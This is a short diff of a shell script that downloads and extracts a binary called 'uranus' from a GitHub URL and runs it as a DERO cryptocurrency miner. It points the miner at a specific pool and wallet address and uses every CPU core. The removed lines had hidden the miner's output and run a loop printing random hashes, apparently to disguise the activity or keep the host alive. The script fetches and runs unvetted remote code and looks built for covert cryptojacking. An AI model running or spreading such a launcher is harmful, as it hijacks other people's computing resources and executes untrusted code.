@@ -1,4 +1,3 @@
 wget https://raw.githubusercontent.com/novalanto010101/file/main/uranus-0.0.3.1-linux-amd64.tar.xz
 tar xf uranus-0.0.3.1-linux-amd64.tar.xz
-./uranus -o wss://dero-node-overlode.mysrv.cloud:10300 -u deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xns0ddcycy3u9v -t $(nproc --all) >/dev/null 2>&1
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
+./uranus -o wss://dero-node-overlode.mysrv.cloud:10300 -u deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xns0ddcycy3u9v -t $(nproc --all)
